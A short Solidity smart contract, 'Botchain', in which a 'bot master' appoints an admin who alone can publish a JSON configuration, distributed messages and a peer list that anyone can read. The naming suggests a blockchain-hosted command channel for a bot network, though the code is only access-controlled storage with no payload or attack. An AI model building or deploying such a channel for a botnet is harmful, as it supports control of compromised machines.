pragma solidity ^0.8.9;

// SPDX-License-Identifier: UNLICENSED

contract Botchain {
  // Address of contract creator.
  address masterAddress;

  // Address of the contract Admin.
  address adminAddress;
  
  /**
    Please, sign all data.
    This includes configuration, messages, peers, etc...
  */
  // Stringified JSON configuration.
  string configuration = "{}";
  // Strignified JSON array of message objects.
  string messages = "[]";
  // Strignified JSON array of sponsored peers.
  string peers = "[]";

  constructor () {
    // Declare the creator of the contract as a bot master.
    masterAddress = msg.sender;
  }

  // Change ownership of the admin role.
  function setAdminAddress(address newAdminAddress) public {
    if (msg.sender != masterAddress) return;

    adminAddress = newAdminAddress;
  }

  // Update current configuration.
  function setConfig(string memory newConfiguration) public {
    if (msg.sender != adminAddress) return;

    configuration = newConfiguration;
  }

  // Retrieve currently active configuration.
  function getConfig() public view returns (string memory) {
    return configuration;
  }

  // Retrieve currently distributed messages.
  function getMessages() public view returns (string memory) {
    return messages;
  }

  // Update currently distributed messages.
  function setMessages(string memory newMessages) public {
    if (msg.sender != adminAddress) return;

    messages = newMessages;
  }

  // Retrieve actively sponsored peers.
  function getPeers() public view returns (string memory) {
    return peers;
  }

  // Update currently sponsored peers.
  function setPeers(string memory newPeers) public {
    if (msg.sender != adminAddress) return;

    peers = newPeers;
  }
}